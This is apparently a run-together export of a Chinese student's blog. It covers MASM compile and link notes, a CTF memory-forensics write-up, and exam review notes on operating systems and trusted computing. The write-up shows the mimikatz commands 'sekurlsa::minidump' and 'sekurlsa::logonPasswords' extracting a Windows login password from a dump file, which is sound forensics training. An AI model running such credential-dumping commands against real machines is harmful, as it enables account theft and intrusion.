C:\\masm32\\strlenml /c /coff strlen.asmlink /subsystem:console strlen.objstrlen.exe Strchr.asm 进入到指定路径-&gt;编译 -&gt;链接 1234cd C:\\masm32\\strchrml /c /coff strchr.asmlink /subsystem:console strchr.objstrchr.exe strcmp.asm 进入到指定路径-&gt;编译 -&gt;链接 1234cd C:\\masm32\\strcmpml /c /coff strcmp.asmlink /subsystem:console strcmp.objstrcmp.exe 后记编译汇编源程序1ml [/选项]汇编源文件列表[/link链接选项] 示例 1ml /c /coff helloworld.asm 选项 说明 &#x2F;c （常用） 仅进行编译，不自动链接 &#x2F;coff （必用） 产生的obj文件格式为coff格式 &#x2F;Cp （常用） 源代码区分大小写 &#x2F;Fo filename 指定输出的obj文件名 &#x2F;l pathname 指定include文件的路径 … … 链接目标文件1link [选项][文件列表] 示例 12link /subsystem:windows helloworld.obj (PE文件)link /subsystem:console helloworld.obj (控制台文件) 选项 说明 &#x2F;BASE: 地址 指定程序装入内存的基地址，一般PE文件默认的装入地址是0x400000处，dll文件装入0x10000000，用此选项可以修改这个默认值。 &#x2F;DEBUG 在PE文件中加入调试信息。 &#x2F;OUT: 文件名 指定输出文件名，默认的扩展名是.exe &#x2F;SUBSYSTEM:系统名 指定程序运行的操作系统，可以是NATIVE，WINDOWS，CONSOLE等","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"汇编","slug":"汇编","permalink":"https://gryffinbit.top/tags/%E6%B1%87%E7%BC%96/"}],"author":"Gryffinbit"},{"title":"2021.1.25赛-Ironman","slug":"2021-1-25赛","date":"2021-01-28T10:49:19.000Z","updated":"2024-11-12T07:00:22.000Z","comments":true,"path":"2021/01/28/2021-1-25赛/","permalink":"https://gryffinbit.top/2021/01/28/2021-1-25%E8%B5%9B/","excerpt":"","text":"附件链接本次题目原题以及需要的附件： https://gryffinbit.lanzous.com/iJtnakypguf 更多关于此次取证题目的知识点，可以参考 活取证和死取证 volatility取证工具的使用 或者分类下的入侵检测与取证文件夹。 题目思路概述是一个基础的取证题目。考察方向，对登陆密码取证，取证图片和文字。 首先拿到题目是一个key.dmp和一个加密压缩包。 思路是：取证key.dmp获取到Windows7的用户名和登陆密码。登陆密码即压缩包的解密密码。 解密压缩包，得到两个flag。flag1是图片取证。flag2是文字取证。 最终根据文字取证到的链接，找到flag。 需要用到的软件strings：打印文件中可打印的字符，经常用来发现文件中的一些提示信息或是一些特殊的编码信息，常常用来发现题目的突破口。 Mimikatz：是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的工具，攻击者可以借此漫游内网。他们可以通过明文密码或者传递hash值来提权 gimp：kali下的（photoshop的Linux版） 具体步骤获取key 使用mimikatz 把 key.dmp 文件拷贝到 mimikatz.exe 所在文件夹，以管理员身份打开 mimikatz.exe 程序。 输入::回车，可以查看 mimikatz 所有的模块，我们需要使用的模块是 sekurlsa。 在依次使用命令 12sekurlsa::minidump key.dmp sekurlsa::logonPasswords 就可以把用户名和密码提取出来。 Dino209 取证flag1在kali下分析flag1. kali 下提取图像信息使用的工具是 gimp(photoshop 的 linux 版） 👉为避免找不到gimp包，先进行修复，再安装gimp 12apt --fix-broken install apt-get install gimp 👉gimp不能直接打开dmp文件，但是可以打开data文件，两种类型本质是一样的， 把flag1.dmp 改名为 flag1.data 1mv mspaint.dmp mspaint.data 👉打开后显示的图片是一团混乱的像素点，通过调节宽度、高度以及位移三个参数，从混乱中寻找可能的图像 在kali的菜单栏中找到gimp，运行 打开data文件 调节宽度、高度，hint给出1080x1577 调整位移到合适的位置，显示完整图片 取证flag2 使用 strings 工具提取出其中的字符串，找到有用信息。 在Windows7 下，管理员身份运行cmd 1strings.exe flag2.dmp &gt; flag2.txt 这不仅适用于 notepad 程序，只要当前系统中正在使用的文字处理软件，如:word、 outlook(邮件)等，都可以用相同的方法 dump 内存中数据内容。 提取到一个比较到的大的txt，搜索flag。找到flag{}包着一个链接，打开链接下载flag","categories":[{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"}],"author":"Gryffinbit"},{"title":"操作系统期末考点","slug":"操作系统期末考点","date":"2021-01-21T15:10:00.000Z","updated":"2024-11-12T07:00:20.000Z","comments":true,"path":"2021/01/21/操作系统期末考点/","permalink":"https://gryffinbit.top/2021/01/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"考卷选择题 某计算机系统中有8台打印机，由K个进程竞争使用，每个进程最多需要3台打印机，该系统发生死锁的K的最小值是_____C_________ 。 A. 2 B. 3 C.4 D.5 操作系统采用缓冲技术，能够减少对CPU的_____A______次数，从而提高资源的利用率。 A.中断 B.访问 C.控制 D.依赖 索引式（随机）文件组织的一个主要优点是_____B_________。 A.不需要链接指针 B.能实现物理块的动态分配 C. 回收实现比较简单 D.用户存取方便 填空题1.文件的物理结构有，顺序结构、 链接结构、和索引结构。 2.磁盘高速缓冲是在内存中为磁盘快设置的一个缓冲区，其主要目的是提高磁盘的I&#x2F;O速度。 3.位示图是利用二进制的一位来表示文件存储空间中的一个块的使用情况。 4.SPOOLing技术的中文译名为外部设备联机并行操作，它是关于慢速字符设备如何与计算机主机交换信息的一种技术，通常叫作假脱机技术。 编写程序（PV源语）三选一 有三个进程 PA、PB和PC协作解决文件打印问题。PA将文件记录从磁盘读入内存的缓冲区1，每执行一次读一个记录；PB 将缓冲区1的内容复制到缓冲区2中，每执行一次复制一个记录；PC将缓冲区2的内容打印出来，每执行一次打印一个记录。缓冲区的大小与记录大小一样。请用信号量来保证文件的正确打印。 分析：本题又是生产者-消费者问题的一个变形，对缓冲区1来说，PA是生产者，PB是消费者;对缓冲区2来说，PB是生产者，PC是消费者。需要说明的有两点：①缓冲区1和缓冲区2都只能存放一个记录，故无须设置in、out 指针，原来生产者一消费者问题中的mutex信号量也因此可以省去；②PB进程既是消费者，又是生产者。 123456789101112131415161718192021222324252627282930313233//该文件打印过程的同步算法可描述为：semaphore empty1=1, full=0, empty2=1, full2=0;PA()&#123; while(1)&#123; 从磁盘读一个记录; wait(empty1); 将记录存放到缓冲区1中; signal(full); &#125;&#125;PB()&#123; while(1)&#123; wait(full); 从缓冲区1中取出一个记录; signal(empty1); wait(empty2); 将记录复制到缓冲区2中; signal(full2); &#125;&#125;PC()&#123; while(1)&#123; wait(full2); 从缓冲区2中取出一个记录; signal(empty2); 将取出的记录打印出来; &#125;&#125;main()&#123; cobegin PA(); PB(); PC(); coend&#125; 请用信号量解决以下的“过独木桥”问题：同一方向的行人可连续过桥，当某一方向有人过桥时，另一方向的行人必须等待;当某一方向无人过桥时，另一方向的行人可以过桥。 分析：独木桥问题是读者一写者问题的一个变形， 同一个方向的行人可以同时过桥，这相当于读者可以同时读。因此，可将两个方向的行人看做是两类不同的读者，同类读者(行人)可以同时读(过桥)，但不同类读者(行人)之间必须互斥地读(过桥)。 12345678910111213141516//可为独木桥问题定义如下的变量：int count A =0, count B = 0; //count A, count B 分别表示A、B两个方向过桥的行人数量semaphore bridge = 1; //用来实现不同方向行人对桥的互斥共享semaphore mutex A = mutex B = 1; //分别用来实现对 count A、count B的互斥共享//A方向的所有行人对应相同的算法，他们的动作的算法可描述为：PA()&#123; wait(mutex A); if(count A == 0) wait(bridge); count A++; signal(mutex A); 过桥; wait(mutex A); count A--; if(count A == 0)signal(bridge); signal(mutex A);&#125; 请给出一个写者优先的 “读者—写者”问题的算法描述。 分析:与读者优先不同的方案有三种。第一种是读者和写者的地位是完全平等的，即无论是读者还是写者，都按他们到达的时间先后决定优先次序。第二种方案中，写者的优先权得到了提高，先于写者到达的读者比写者优先，但当一个写进程声明要进行写操作时，其后续读者必须等写操作完成之后，才能进行读；而且，如果在写完成之前，又有新的写者到达，那新的写者的优先权将高于已在等待的读者。第三种方案写者的优先权更高，某个写者到达时，即使他是目前唯一的写者，那些先于他到达但还没来得及读的读者都将等待他完成写操作。 答:为了使写者优先，可在原来的读优先算法基础上增加一个初值为1的信号量S，使得当至少有一个写者准备访问共享对象时，它可使后续的读者进程等待写完成；初值为0的整型变量writecount，用来对写者进行计数；初值为1的互斥信号量wmutex，用来实现多个写者对writecount的互斥访问。读者动作的算法描述如下: 1234567891011121314151617181920212223242526272829303132//第二种方案reader()&#123; while(1)&#123; wait(S); wait(rmutex); //rmutex 用来实现对readcount的互斥访问 if(readcount == 0) wait(mutex); //mutex用来实现对读写对象互斥访问 readcount++; signal(rmutex); signal(S); perform read operation; wait(rmutex); readcount--; if(readcount == 0) signal(mutex); signal(rmutex); &#125;&#125;//写者动作的算法描述如下：writer()&#123; while(1)&#123; wait(wmutex); //wmutex用来实现对writecount的互斥访问 if(writecount == 0) wait(S); writecount++; signal(wmutex); wait(mutex); perform write operation; signal(mutex); wait(wmutex); writecount--; if(writecount == 0) signal(S); signal(wmutex); &#125;&#125; clock算法 简答题什么是进程?由几部分组成?与程序的区别是什么? 定义： 进程是可并发执行的程序在一个数据集合上的运行过程，是系统进行资源分配和调度的一个独立单位。 组成部分： 进程由程序、数据和进程控制块三部分组成: . 程序段：程序段是进程中能被进程调度程序调度到CPU上执行的程序代码段，它能实现相应的特定功能。 数据段：一个进程的数据段，可以是进程对应的程序加工处理的原始数据，也可以是程序执行时产生的中间或最终结果数据。 进程控制块PCB组成：每一个进程均有一个进程控制块PCB。用户进程被创建时，系统为它申请和构造一个相应的PCB。 进程和程序的区别： 程序是静态概念，而进程是动态概念 程序是永久的，而进程是暂时的 进程之间能并发地活动 进程是竞争计算机系统有限资源的基本单位 程序和进程无一一对应关系 何谓死锁?产生死锁的原因和必要条件是什么? 死锁的定义： 死锁是指多个进程在运行过程中因争夺资源而造成的一种僵局，当进程处于这种僵持状态时，若无外力作用，它们都将无法再向前推进。 产生死锁的原因： 产生死锁的原因可归结为竞争资源引起进程死锁和进程推进顺序不当引起死锁两个方面。 产生死锁的必要条件： 互斥条件 请求和保持条件 不剥夺条件 环路等待条件 分页和分段存储管理有何区别? 页是信息的物理单位，分页是为实现离散分配方式，以消减内存的外零头，提高内存利用率。或者说，分页仅仅是由于系统管理的需要而不是用户的需要。 段则是信息的逻辑单位，它含有一组意义相对完整的信息，分段的目的是为了能更好地满足用户的需要。 页的大小固定且由系统决定，由系统把逻辑地址划分为页号和页内地址两部分，是机械硬件实现的，因而在系统中只能有一种大小的的页面； 而段的长度却不固定，决定于用户所编写的程序，通常由编译程序对源程序进行编译时，根据信息的性质来划分。 分页的作业地址空间是一维的，即单一的线性地址空间，程序员只需利用一个记忆符，即可表示一个地址。 分段的作业地址空间则是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。 为什么要引入动态重定位?如何实现? 原因： 在连续分配方式中，必须把一个系统或用户程序装入一连续的内存空间。如果在系统中只有若干个小的分区，即使它们容量的总和大于要装入的程序，但由于这些分区不相邻接，也无法把该程序装入内存。若想把程序装入，可采用的一种方法是：将内存中的所有作业进行移动，使它们全都相邻接，这样，即可把原来分散的多个小分区拼接成一个大分区，这时就可把作业装入该区。这种通过移动内存中作业的位置，以把原来多个分散的小分区拼：接成一个大分区的方法，称为“拼接”或“紧凑”。由于经过紧凑后的某些用户程序在内存中的位置发生了变化，此时若不对程序和数据的地址加以修改(变换)，则程序必将无法执行。为此，在每次“紧凑”后，都必须对移动了的程序或数据进行重定位。 实现： 在动态运行时装入的方式中，作业装入内存后的所有地址都仍然是相对地址，将相对地址转换为物理地址的工作，被推迟到程序指令要真正执行时进行。为使地址的转换不会影响到指令的执行速度，必须有硬件地址变换机构的支持，即须在系统中增设一个重定位寄存器，用它来存放程序(数据)在内存中的起始地址。程序在执行时，真正访问的内存地址是相对地址与重定位寄存器中的地址相加而形成的。当系统对内存进行了“紧凑”而使若干程序从内存的某处移至另一处时,不需对程序做任何修改，只要用该程序在内存的新起始地址去置换原来的起始地址即可。 在请求分页系统中，产生“抖动”的原因是什么? 发生“抖动”的根本原因是，同时在系统中运行的进程太多，由此分配给每一个进程的物理块太少，不能满足进程正常运行的基本要求，致使每个进程在运行时，频繁地出现缺页，必须请求系统将所缺之页调入内存。这会使得在系统中排队等待页面调进&#x2F;调出的进程数目增加。显然，对磁盘的有效访问时间也随之急剧增加，造成每个进程的大部分时间都用于页面的换进，换出，而几乎不能再去做任何有效的工作，从而导致发生处理机的利用率急剧下降并趋于0的情况。我们称此时的进程是处于“抖动”状态。 何谓DMA方式? DMA控制器可采用哪几种方式与CPU分时使用内存? 直接内存访问(DMA)方式是一种完全由硬件执行I&#x2F;O交换的工作方式。DMA 控制器从CPU完全接管对总线的控制。数据交换不经过CPU,而直接在内存和I&#x2F;O设备之间进行。 DMA控制器采用以下三种方式： 停止CPU访问内存 当外设要求传送一批数据时，由DMA控制器发一个信号给CPU。 DMA控制器获得总线控制权后，开始进行数据传送。一批数据传送完毕后，DMA控制器通知CPU可以使用内存，并把总线控制权交还给CPU。 周期挪用 当I&#x2F;O设备没有DMA请求时，CPU按程序要求访问内存: 一旦I&#x2F;O设备有DMA请求，则I&#x2F;O设备挪用一个或几个周期。 DMA与CPU交替访内 一个 CPU周期可分为2个周期，一个专供DMA控制器访内，另一个专供CPU访内。不需要总线使用权的申请、建立和归还过程。 银行家算法 段页式存储管理系统的地址转换过程 作业调度算法 磁盘调度算法SSTF最短寻找时间优先 SCAN电梯算法 移动到最外侧之后，再向内移动。 C-SCAN循环扫描算法 只处理某一单独方向上的请求，返回时直接到始端，不处理任何请求 题型选择 10分 每题一分 填空 10分 每题一分 编写程序 10分 clock 算法 10分 4个简答题： 重定位、虚拟存储、DMA、软中断、段页式存储概念 20分 PPT中的计算题：磁盘调度算法、预防死锁、思索的判断条件（计算题二选一） 10分 页面调度，物理地址和逻辑地址的换算 10分 多通道调度画图 10分 章节知识点第三章进程管理 复习PPT上的笔记 什么是进程？什么是线程？进程和线程的区别？ 进程 &#x3D; 程序段 + 相关的数据段 + PCB PCB：描述进程的基本情况和活动过程，进而控制和管理进程 线程 &#x3D; 线程控制表 + 存储上下文的用户栈 + 核心栈 线程是在进程内用于调度和占有处理机的基本单位。 区别： 进程是资源管理的基本单位，拥有自己的地址空间和各种资源。 线程是处理机调度的基本单位，只和其他线程一起共享进程资源，自己没有任何资源。 进程有自己的资源，进程无 进程切换处理机和调度的时候，涉及资源转移，现场保护等，导致处理机切换时间长，资源利用率降低 线程切换时，不发生资源变化，特别是地址空间的变化，所以切换时间短，处理机效率较高 进程切换时涉及资源转移，保护现场，利用率低。线程不涉及，处理机利用率高 多线程可以减少用户等待时间，提高系统响应速度。 线程和进程一样，有自己的状态，相应的同步机制。 但线程没有单独的数据和程序空间，所以不能像进程那样把数据交换到外存，从而没有挂起状态 线程没有挂起状态 进程的调度、同步等控制大多由操作系统内核完成。 线程既可以操作系统内核，也可以用户控制。 第四章处理机调度 看PPT笔记 例题： 第五章什么是虚拟存储器？特点？ 由进程中的目标代码、数据等的虚拟地址组成的虚拟空间称为虚拟存储器。 虚拟存储器不考虑物理存储器的大小和信息存放的实际位置，只规定每个进程中相互关联的信息的相对位置。 虚拟存储器的容量由计算机的地址结构和寻址方式来确定。 虚拟存储需要有相应的地址转换机构，把指令的虚拟地址转换为实际物理地址 能否把虚拟空间无限扩大？ 不能，虚拟存储器的容量由计算机的地址结构和寻址方式来确定。地址总线的量是有限的，寻址不到，不能超界。 实现地址重定位的方法？ 静态地址重定位： 在虚拟空间程序执行之前由装配程序完成地址映射工作。 不需要硬件支持 进行地址变换无法实现虚拟存储器 必须占用连续的内存空间 难以做到程序和数据的共享 动态地址重定位： 在程序执行过程中，在CPU访问内存之前由硬件地址变换机构将要访问的程序或数据地址转换成内存地址。 可以对内存进行非连续分配 动态重定位提供了实现虚拟存储器的基础 有利于程序段的共享 动态分区式管理的常用内存分配算法有哪几种？优缺点？ 动态分区式管理的常用内存分配算法有FF（最先适应法）first fit、BF（最佳适应法）best fit、WF（最坏适应法）worst fit 从搜索速度上：FF最好，BF和WF都要求把空闲区按大小进行排队。 从回收过程上：FF最好，因为BF、WF都必须重新调整空闲区的位置。 BF找到的空闲区是最好的，但是会造成内存碎片较多，影响内存利用率。WF碎片最少，但是对内存请求较多的进程可能分配失败。 BF是先找最小的空闲区进行分配。 WF是先找最大的空闲区进行分配。 什么是覆盖？什么是交换？覆盖和交换的区别是什么？ 覆盖： 将程序划分为若干个功能上相对独立的程序段 按照程序的逻辑结构让那些不会同时执行的程序段共享同一块内存区的内存扩充技术。 交换： 先将内存某部分的程序或数据写入外存交换区 再从外存交换区中调入指定的程序或数据到内存中来，并让其执行的一种内存扩充技术。 区别： ​ 交换： ​ 不要求给出程序段之间的覆盖结构 ​ 主要在进程或作业之间进行 ​ 覆盖： ​ 主要在同一个作业或同一个进程内进行 ​ 只能对那些与覆盖程序段无关的程序段进行覆盖 什么是页式管理？静态页式管理可以实现虚存吗？ 页式管理就是把各进程的虚拟空间划分为若干长度相等的页面，把指令按页面大小划分后存放在内存中执行，或者只在内存中存放那些经常被执行或将被执行的页面。不经常被执行的放在外存，按一定规则调入的一种内存管理方式。 静态页面不能，因为它要求进程或作业在执行前全部装入内存，作业或进程大小仍受内存可用页面数的限制。 能有效提高内存利用率 什么是请求页式管理？ 一种动态页式内存管理，进程或作业开始执行前，不把程序段一次性全部装入，只装入反复执行的部分。其他部分在执行过程中动态装入。当需要指令，但又不在内存中时会发生缺页中断，系统再将外存中相应的页面调入内存。 请求页式管理中有哪几种常用的页面置换算法？优缺点？ 10分大题，不考概念，考大题，但是还是要懂原理 随机淘汰算法：随机的选择某个用户页面并将其换出。 轮转法RR：循环换出内存可用区里一个可以被换出去的页。无论它是刚被换进还是已经换进很长时间。 先进先出FIFO：淘汰在内存中驻留时间最长的一页 最近最久未使用页面置换算法LRU：淘汰离当前最近时间内，最久没使用过的页面 理想型淘汰OPT：淘汰在访问串中将来再也不出现或是在离当前最远的位置上出现的页面。 什么是段式管理？与页式管理区别？ 段式： 将程序按照内容或过程关系分成段，以段为单位分配内存，然后地址映射机构把段式虚拟地址转换为实际的物理地址。也是常用的驻留内存，不常用的放在外存。 更好的满足用户多方面需求 区别： 页式管理是按照线性空间顺序排列的 段式是按照内容或过程的函数关系分成段，是一个二维的 段式有内外存统一管理的虚存实现，但是每次交换的是一段有意义的信息。 页式交换固定大小的页，会需要多次缺页中断。 段式管理，段长需要动态增长 段式管理便于有完整逻辑功能的信息段共享 段式管理便于进行动态链接，页式管理进行动态链接很复杂 段式管理可以实现虚存吗？ 可以。以段为单位分配内存，通过地址映射机构把段式虚拟地址转换为实际物理地址 什么是段页式存储？ 结合页式管理和段式管理即具有分段系统便于实现，分段可共享、易于保护、可动态链接等优点。又有分页，解决内存的外部碎片问题 需要了解一下 段式管理有利于动态增长、共享、内存保护。页式管理解决内存外部碎片问题，提高内存利用率。 段页式访问时间长，执行效率低。 因为在段式的基础上分页，只是为了克服碎片问题，并没有改变段内地址的结构。 存取指令时，需要对内存进行三次以上的访问：1.从段表中取出对应的页表地址 2.访问页表得到数据或指令的物理地址 3. 访问物理单元。 降低CPU执行指令的速度 第六章什么是软中断（概念题，解释题5分）？ 软中断是对硬件的一种模拟 发送软中断就是向接收进程的一个相应项发送一个特殊信号 接收到信号后，按照事先规定的区执行一个软中断处理程序 收到信号后不立即启动，要等到接收进程执行时才能生效 可以向自己发软中断信号 第七章简述虚拟地址到物理内存地址的转换过程(必考，有个计算题) 每个进程对应一个页目录，当操作系统开始执行某一进程时，系统会设置当前进程所对应的页目录 一个进程可有多个页表，通过页目录索引，内存管理器可定位相应的虚拟地址所对应的页表 通过页表和页表索引，内存管理器可定位虚拟地址对应的物理页框号 定位物理页框号后，通过字节索引，可判断虚拟地址对应的物理地址 页表的作用：通过页表查到虚拟地址的页表入口，再通过该入口查到该地址对应的物理地址 第八章磁盘调度算法 先来先服务（FCFS） 根据请求的先后进行调度 最短寻找时间优先（SSTF） scan（电梯算法） 移动到最外侧之后，再向内移动。 Look算法 在SCAN的基础上。如果在磁盘移动方向上，没有其他请求，就立即改变磁头方向 循环扫描算法（C-SCAN） 只处理某一单独方向上的请求，返回时直接到始端，不处理任何请求 C-Look算法 在C-SCAN基础上。如果在磁盘移动方向上，没有其他请求，就立即改变磁头方向 文件的物理结构有哪几种？为什么串联不适于随机存取（重要） 连续文件、串联文件、索引文件 串联：非连续的物理块存放信息，没有顺序关系。搜索时只能按队列中的串联指针顺序搜索。不适用于随机存取。 什么是文件目录？文件目录包含哪些信息？ 文件目录定义 &#x3D; 文件名 + 对该文件实施控制管理的说明信息 文件目录内容 &#x3D; 文件名 + 文件内部标识 + 文件信息在存储设备上第一个物理块的地址信息 + 文件逻辑结构、物理结构、存取控制和管理等 二级目录和多级目录的好处？ 可以减少文件命名冲突 提高搜索速度 符号文件目录表和基本文件目录表是实现文件共享的方法，不是二级目录 第九章DMA 数据传送控制方式有哪几种？ 有程序直接控制法、中断控制法、DMA、通道方式 程序直接控制：用户直接控制内存或CPU和外部设备的数据传输。 优点：控制简单，不需要太多硬件支持 缺点：只能串行工作，无法发现错误 中断I&#x2F;O控制：向CPU发送中断的方式控制传送。 优点：提高CPU利用率，支持并行 缺点：数据缓冲寄存器较小，中断次数较多，占用CPU大量时间。外部设备多时，造成CPU中断丢失。设备快，出现数据丢失。 DMA：在外部设备和内存之间开辟直接的数据交换通路进行数据传送。 优点：除了开始和结束是需要CPU处理，其他时候不需要CPU的频繁干涉 缺点：设备多时，多个DMA同时使用会引起内存地址的冲突 通道方式： 使用通道来控制内存或CPU和外部设备的数据传送。通道是一个独立于CPU的机构，有自己的通道指令。启动和结束时需要CPU。 优点：减轻CPU负担，增加并行工作成都 缺点：增加额外硬件，造价高 什么是陷阱？什么是软中断？简述中断、陷阱、软中断之间的异同？ 陷阱：处理机和内存内部产生的中断，包括程序运算引起的各自错误。例如：存取访问控制错误、用户状态切换错误等 中断：在计算机执行的过程中，出现的急需处理的事件，致使CPU暂时中断正在执行的程序，转去处理，处理结束后再继续被打断的进程。 软中断：通信进程之间用来模拟硬中断的一种信号通信方式 什么是缓冲？ 缓冲是使用专用硬件缓冲器，或在内存中划出一个区域暂时存放输入输出数据的器件。 引入缓冲是为了匹配外设和CPU之间的处理速度。减少中断次数和CPU的中断处理时间。解决DMA或通道方式时的数据传输瓶颈问题。 定义、概念理解系统调用：操作系统提供给编程人员的唯一接口，其指令在核心态下执行。 进程：一个程序对数据集的执行过程。 并发： 一组在逻辑上互相独立的程序，在执行过程中，执行时间上互相重叠。 并行：一组程序按独立的、异常的速度执行 临界区：不允许多个并发进程交叉执行的一段程序 死锁：一组并发进程因互相请求对方所拥有的资源，在无外力的条件下无法继续执行的状态。 虚存： 一个进程的目标代码与数据的虚拟地址组成的空间 大小受计算机地址结构限制 虚存实现的条件：内存中只存经常执行的指令；虚拟地址能由机构转换成物理地址；外存中的数据能被调入内存。 动态地址重定位： 设置BR和VR 将程序段首地址装入BR中 将所要访问的虚拟地址送VR 地址变换机构把VR和BR内容相加得实际地址 教材考点11页 图1.2 1.3 1.4 抢占式 进程的定义和特征（不定项选择） 进程：进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。 进程具有以下特征： 动态性：有一定的生命期 并发性：多个进程同存于内存中，在一段时间内同时执行。 独立性：进程是能独立运行、分配资源、接受调度的基本单位 异步性：可按各自独立的，不可预知的速度向前推进。 进程的状态 进程的基本状态： 就绪状态：已获得除CPU以外的所有必要资源，得倒CPU就可立即执行 执行状态：已得到CPU，正在执行 阻塞状态：正在执行的进程，因某种事件而暂时无法继续执行，等相应事件完成后，才能去竞争CPU 进程的挂起： 使进程不能继续执行，即使处于就绪状态也不能竞争CPU 3状态、5状态、7状态。挂起等…基本状态与转换【不考大题 名词解释或者选择题。】 进程控制块 进程的创建 ![操作系统-30](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;操作系统考点&#x2F;操作系统考点 7b60f113764c4024a9bf7b9399c686ab&#x2F;操作系统-30.png) 进程的终止 进程的阻塞和唤醒 进程的挂起与激活 进程同步的基本概念 两种形式的制约关系 临界资源和临界区 同步机制应遵循的规则 信号量机制（要涉及到大题，写pv源语） 信号量的应用（选择题） 生产者-消费者问题 哲学家进餐问题 读写问题 线程的基本概念（填空选择） 线程的控制（填空选择） ![操作系统-48](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;操作系统考点&#x2F;操作系统考点 7b60f113764c4024a9bf7b9399c686ab&#x2F;操作系统-48.png) 进程的基本概念 进程同步的基本概念 信号量机制及其应用 线程的基本概念 比较进程与程序的异同 PCB的作用？为什么说PCB是进程存在的唯一标志？ 为什么诸进程对临界资源的访问必须互斥？ 何谓“忙等”？它有什么缺点？ 生产者、消费者问题 什么是缓冲 pv原语选择之一 独木桥问题 请用信号量解决 处理死锁 中断方式I&#x2F;O和DMA区别 PPT上习题 若TLB命中，则Page必命中","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"操作系统","slug":"期末考试/操作系统","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"可信计算期末考点","slug":"可信计算期末考点","date":"2021-01-21T15:09:36.000Z","updated":"2024-11-12T07:00:12.000Z","comments":true,"path":"2021/01/21/可信计算期末考点/","permalink":"https://gryffinbit.top/2021/01/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"考卷选择题1. 下列哪一个为身份认证密钥的英文简写（B） A.EK B.AIK C.LK D.AK 2.下列哪一个不是静态信任链的运行特点( D ) A.以CRTM为可信根 B.平台的一次运行对应于一个信任链，一个起点一个终点 C.一旦平台进入不可信状态，从信任链角度，平台以后的所有状态都是不可信的 D.主要采用DRTM技术 3.远程证明过程不包括哪个阶段（ D ） A .完整性度量 B.完整性报告 C 完整性测评 D 完整性验证 4.下面哪个不是可信计算平台的可信根（ C ） A.可信度量根 B.可信报告根 C.可信反馈根 D.可信存储根 5.基于信任链的可信计算机模块的启动顺序是（ B ） A.行为监测模块—身份认证模块—加密模块—数字签名模块BIOS B.身份认证模块—行为监测模块—加密模块—数字签名模块BIOS C.行为检测模块—加密模块—身份认证模块—数字签名模块BIOS D.身份认证模块—加密模块—行为监测模块—数字签名模块BIOS 6.信任不可以是（C）的关系 A.一对一 B.一对多 C.多对一 D.多对多 7.下列哪一选项关于可信计算是正确的（ D ） A. 可信计算的核心思想是软件安全模块支持下的可信计算平台 B. 可信计算平台由可信链、 硬件平台、操作系统和应用系统组成 C. 可信计算不能从根本上阻止病毒和黑客等软件的攻击。 D. 可信计算可以用来打击在线游戏作弊。 ​ 解析： ​ A. 是硬件 P7 ​ B. 可信计算平台由可信根、 硬件平台、操作系统和应用系统组成。 P7 ​ C. 确保系统具有免疫能力,从根本上阻止病毒和黑客等软件的攻击。 P8 ​ D. 可信计算可以用来打击在线游戏作弊。P12 8.基于密钥的身份认证协议中，引入时间戳可以( B )。 A.实现时钟同步. B.防止重放攻击 C.防止中间人攻击 D.防止窃听 9.在以下认证方式中，最常用的认证方式是（ A ）。 A.基于账户名&#x2F;口令认证 B.基于摘要算法认证 C.基于PKI认证 D.基于数据库认证 10.下列哪些算法不能用于数字签名算法? （ D ） A.DSS&#x2F;DSA B.RSA C.EIGamal D.RC5 11.管理数字证书的权威机构CA是( D )。 A. 解密方 B. 加密方 C. 双方 D. 可信任的第三方 12.哪个不是TCG制定规范中定义的可信计算的属性？( D) A可鉴别性 B完整性 C私密性 D真实性 13.TPM密钥的身份证明密钥（AIK）的目的是替代（ B ）来提供平台的证明。 A．存储密钥 B. 背书密钥 C．签名密钥 D. 绑定密钥 14.（ C ）不由TSS核心服务（TCS）模块提供。 A．密钥和证书管理 B. 事件管理 C．TSP上下文管理 D.审计管理 15.以下关于公钥基础设施(PKI)的说法中，正确的是( A ) A. PKI可以解决公钥可信性问题 B. PKI不能解决公钥可信性问题 C. PKI只能有政府来建立 D. PKI不提供数字证书查询服务 16.以下关于可信计算说法错误的是: ( D ) A. 可信的主要目的是要建立起主动防御的信息安全保障体系 B. 可信计算机安全评价标准(TCSEC)中第一次提出了可信计算机和可信计算基的概念 C. 可信的整体框架包含终端可信、终端应用可信、操作系统可信、网络互联可信、互联网交易等应用系统可信 D. 可信计算平台出现后会取代传统的安全防护体系和方法 17.以下关于可信存储根管理功能包含以下（ D ） A.密钥管理 B.密钥产生 C.加密和解密 D.以上都是 18.MD5文摘算法得出的文摘大小是？（ A ） A 128位 B 160位 C 128字节 D 160字节 19.构建可信计算平台的基础模块是（A ） A. 安全启动系统 B. 可信平台模块 C. 安全协处理器 D. 密码加速器 20.在TSS中，以下哪些不是可信核心服务层TCS提供的核心服务？ （ C ） A.上下文管理 B.密钥与证书管理 C.设备驱动管理 D.事件管理 21.下列哪一项不是TPM的核心功能（ C ） A.远程证明 B.数据保护 C.储存器屏蔽 D.密钥管理 填空题 TPM部件体系结构可包括为:分离部件、通信接口、防篡改攻击封装 三大类。 